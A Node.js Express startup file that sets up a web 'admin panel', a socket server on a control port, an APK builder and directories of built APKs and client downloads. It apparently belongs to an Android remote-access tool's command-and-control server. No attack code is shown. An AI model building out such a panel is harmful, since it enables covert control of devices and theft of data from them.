// server/init.js

const express = require('express');
const path = require('path');

const app = express();

// Core modules
const config = require('./core/config');
const db = require('./core/databaseGateway');
const logManager = require('./core/logManager');
const clientManager = new (require('./core/clientManager'))(db);
const apkBuilder = require('./core/apkBuilder');
const initSocketServer = require('./core/IOsocket');

// Global bindings
global.config = config;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// Start socket server
initSocketServer(config.control_port, clientManager, config);

// Setup Web Interface
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'web/ui'));
app.use(express.static(path.join(__dirname, 'web/assets')));
app.use('/client_downloads', express.static(path.join(__dirname, 'database/client_downloads')));
app.use(express.static(path.join(__dirname, 'database/built_apks')));
app.use(require('./core/expressRoutes'));

// Start Web Server
app.listen(config.web_port, () => {
    console.log(`🔧 Admin panel running at: http://localhost:${config.web_port}`);
    logManager.log('info', `Web UI started on port ${config.web_port}`);
});
